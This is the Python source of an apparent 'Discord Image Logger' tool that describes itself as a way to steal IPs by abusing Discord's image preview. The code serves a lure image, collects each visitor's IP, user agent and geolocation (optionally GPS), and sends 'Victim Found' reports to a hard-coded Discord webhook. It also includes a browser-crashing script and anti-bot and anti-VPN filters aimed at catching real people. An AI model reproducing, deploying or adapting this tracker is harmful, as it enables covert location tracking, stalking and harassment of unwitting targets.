# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# https://github.com/dekrypted/Discord-Image-Logger

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse
import traceback
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1460902794729885800/4ShIlI83R2SgTs0g6i_iZkO0Rf-0pvYrOcNrW5ZBbwdbPBHBtyR8VRhZYLlFyDqF7-Gz",
    "image": "https://i.ytimg.com/vi/IpBIe1NZ1II/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLBqiPmw921yZTvCO_Tfk_ptd7ErfA",  # You can also have a custom image by using a URL argument
    "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
                            # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)

    # CUSTOMIZATION #
    "username": "Image Logger",  # Set this to the name you want the webhook to have
    "color": 0x00FFFF,  # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    "accurateLocation": True,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
    "message": {  # Show a custom message when the user opens the image
        "doMessage": False,  # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
        "richMessage": True,  # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1,  # Prevents VPNs from triggering the alert
                    # 0 = No Anti-VPN
                    # 1 = Don't ping when a VPN is suspected
                    # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True,  # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True,  # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1,  # Prevents bots from triggering the alert
                   # 0 = No Anti-Bot
                   # 1 = Don't ping when it's possibly a bot
                   # 2 = Don't ping when it's 100% a bot
                   # 3 = Don't send an alert when it's possibly a bot
                   # 4 = Don't send an alert when it's 100% a bot

    # BLACKLIST #
    "blacklistedIPs": ("27", "104", "143", "164"),  # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.

    # REDIRECTION #
    "redirect": {
        "redirect": False,  # Redirect to a webpage?
        "page": "https://your-link.here"  # Link to the webpage to redirect to
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image
}

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False


def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP\n\n**Error:**\n\n{error}\n\n",
            }
        ],
    })


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if any(ip.startswith(x) for x in config["blacklistedIPs"]):
        return

    bot = botCheck(ip, useragent)

    if bot:
        if config["antiBot"] in [2, 4]:
            return
        elif config["antiBot"] in [1, 3]:
            ping = ""
        else:
            ping = "@everyone"
    else:
        ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=66842623").json()
    except:
        info = {"status": "fail"}

    if info["status"] != "success":
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": ping,
            "embeds": [
                {
                    "title": "Image Logger - Grab Failed",
                    "color": config["color"],
                    "description": f"**IP:** `{ip}`\n**User Agent:** `{useragent}`\n**Possible Bot:** `{bot}`\n**Endpoint:** `{endpoint}`",
                }
            ],
        })
        return

    fields = [
        {"name": "IP", "value": f"`{ip}`", "inline": True},
        {"name": "User Agent", "value": f"```{useragent[:900]}```", "inline": False},
        {"name": "ISP", "value": info["isp"], "inline": True},
        {"name": "Organisation", "value": info["org"], "inline": True},
        {"name": "Country", "value": f"{info['country']} ({info['countryCode']})", "inline": True},
        {"name": "Region", "value": f"{info['regionName']} ({info['region']})", "inline": True},
        {"name": "City", "value": info["city"], "inline": True},
        {"name": "Timezone", "value": info["timezone"], "inline": True},
        {"name": "Coords", "value": f"`{info['lat']}, {info['lon']}`", "inline": True},
        {"name": "Endpoint", "value": f"`{endpoint}`", "inline": True},
    ]

    if coords:
        fields.append({"name": "GPS Coordinates", "value": f"`{coords}`", "inline": False})

    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": ping,
        "embeds": [
            {
                "title": "Image Logger - Victim Found",
                "color": config["color"],
                "fields": fields,
                "footer": {"text": f"Discord Image Logger v{__version__} by {__author__}"},
            }
        ],
    })


class ImageLogger(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url = self.path
            parsed = urlparse(url)
            params = parse_qs(parsed.query)

            user_agent = self.headers.get("User-Agent", "N/A")
            ip = self.client_address[0]

            if config["redirect"]["redirect"]:
                self.send_response(301)
                self.send_header("Location", config["redirect"]["page"])
                self.end_headers()
                makeReport(ip, user_agent, endpoint="Redirect")
                return

            if config["crashBrowser"]:
                # Very basic/old crash attempt - most modern browsers ignore/fix this
                content = "<script>a=0;while(true){a+=1}</script>".encode()
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(content)
                makeReport(ip, user_agent, endpoint="Crash Attempt")
                return

            if config["message"]["doMessage"]:
                content = config["message"]["message"].encode()
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(content)
                makeReport(ip, user_agent, endpoint="Message")
                return

            # Default: serve image
            if config["imageArgument"] and "url" in params:
                image_url = params["url"][0]
            else:
                image_url = config["image"]

            try:
                image_data = requests.get(image_url, timeout=5).content
                content_type = requests.get(image_url).headers.get("Content-Type", "image/jpeg")
            except:
                # Fallback tiny transparent GIF
                image_data = base64.b64decode(
                    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
                )
                content_type = "image/gif"

            self.send_response(200)
            self.send_header("Content-type", content_type)
            self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
            self.send_header("Pragma", "no-cache")
            self.send_header("Expires", "0")
            self.end_headers()
            self.wfile.write(image_data)

            makeReport(ip, user_agent, endpoint="Image Load")

        except Exception as e:
            traceback.print_exc()
            reportError(str(e))


if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 80), ImageLogger)  # ← change port if needed
    print("Image logger server started on port 80...")
    server.serve_forever()
